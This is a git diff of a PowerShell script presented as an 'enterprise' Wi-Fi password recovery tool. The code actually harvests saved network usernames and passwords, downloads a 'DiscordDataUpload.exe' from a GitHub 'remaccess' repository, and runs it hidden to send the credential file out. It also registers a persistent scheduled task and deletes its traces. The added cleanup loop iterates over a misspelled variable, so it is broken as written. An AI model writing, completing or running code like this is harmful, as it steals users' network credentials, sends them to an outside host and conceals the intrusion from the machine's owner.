@@ -1,7 +1,8 @@
 #Fully Functional script to recover Usernames and Passwords for Enterprice Networks.
 $directoryPath = "C:\Windows\System32"
 $localFilePath = "C:\Windows\System32\EnterpriseWifiPasswordRecover.exe"
-$outputFilePath = "C:\Windows\System32\output.txt"
+$phase1outputfile = "C:\Windows\System32\WifiEntLog.txt"
+$finaloutput = "C:\Windows\System32\WifiPhase2Log.txt"
 $boturl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe"
 $botpath = "C:\Windows\System32\DiscordDataUpload.exe"
 $userAccounts = Get-LocalUser | Select-Object -ExpandProperty Name
@@ -72,11 +73,10 @@ Unregister-ScheduledTask -TaskName $pingdaemontask -Confirm:$false
 Register-ScheduledTask -Xml $pingdaemonxml -TaskName $pingdaemontask | Out-Null
 Start-ScheduledTask -TaskName $pingdaemontask
 $currentUsername = $env:USERNAME
-$outputPath = Join-Path -Path "C:\Windows\System32" -ChildPath ("$currentUsername" + "epa.txt")
-Start-Process -FilePath $localFilePath -ArgumentList "-u $currentUsername" -RedirectStandardOutput $outputPath -Wait
-if (Test-Path $outputPath) {
+Start-Process -FilePath $localFilePath -ArgumentList "-u $currentUsername" -RedirectStandardOutput $phase1outputfile -Wait
+if (Test-Path $phase1outputfile) {
 } else {}
-$outputContent = Get-Content $outputFilePath
+$outputContent = Get-Content $phase1outputfile
 $usernames = @()
 $passwords = @()
 $userRegex = "Username: (.+)"
@@ -92,30 +92,24 @@ if ($usernames.Count -eq $passwords.Count) {
     $credentialsTable = @()
     for ($i = 0; $i -lt $usernames.Count; $i++) {
         $credentialsTable += [PSCustomObject]@{
-            File = $outputFilePath
+            File = $phase1outputfile
             Username = $usernames[$i]
             Password = $passwords[$i]
         }
     }
 }
-$credentialsTable | Format-Table -AutoSize | Out-File -FilePath $outputFilePath
+$credentialsTable | Format-Table -AutoSize | Out-File -FilePath $finaloutput
 Invoke-WebRequest -Uri $boturl -OutFile $botpath
 if (Test-Path $botpath) {
-    $output = "C:\Windows\System32\output.txt"
-    Start-Process -FilePath $botpath -ArgumentList "-File $output" -WindowStyle Hidden
+    Start-Process -FilePath $botpath -ArgumentList "-File $finaloutput" -WindowStyle Hidden
 } else {}
 #CleanUP
-$folderPath = "C:\Windows\System32\profiles"
-if (Test-Path $localFilePath) {
-    Remove-Item -Path $localFilePath -Force
-} else {}
-$filesToDelete = Get-ChildItem -Path "C:\Windows\System32" -Filter "*epa.txt"
-foreach ($file in $filesToDelete) {
-    Remove-Item -Path $file.FullName -Force
+$filePaths = @($finaloutput, $phase1outputfile, $localFilePath, $botpath, "C:\Windows\System32\profiles")
+foreach ($file in $filepath) {
+    if (Test-Path $file -PathType Leaf) {
+        Remove-Item -Path $file -Force
+    } else {}
 }
-if (Test-Path $folderPath) {
-    Remove-Item -Path $folderPath -Recurse -Force
-} else {}
 Timeout /NoBreak 30
 if (Test-Path $botpath) {
     Remove-Item -Path $botpath -Force
